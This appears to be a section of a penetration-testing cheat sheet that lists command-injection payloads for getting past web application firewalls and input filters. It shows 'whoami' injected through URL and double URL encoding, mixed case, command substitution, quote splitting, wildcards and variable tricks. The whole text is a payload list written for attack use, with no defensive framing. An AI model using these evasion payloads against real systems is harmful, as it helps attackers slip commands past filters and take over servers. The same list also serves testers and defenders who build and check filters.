## 🛠️ Bypass WAF / Filters

### URL Encoding
```text
%3Bwhoami              # ;
%26whoami              # &
%7Cwhoami              # |
%60whoami              # `
%24%28whoami%29        # $(whoami)
```

### Double URL Encoding
```text
%253Bwhoami
```

### Case Variation
```text
; WhOaMi
; wHoAmI
```

### Command Substitution
```text
$(echo whoami)
`echo whoami`
```

### Concatenation
```text
; w'h'o'a'm'i
; w"h"o"a"m"i
```

### Wildcards
```text
; /???/??whoami
; /usr/bin/w*ami
```

### Variables
```text
; whoam$()i
; wh$1oami
```

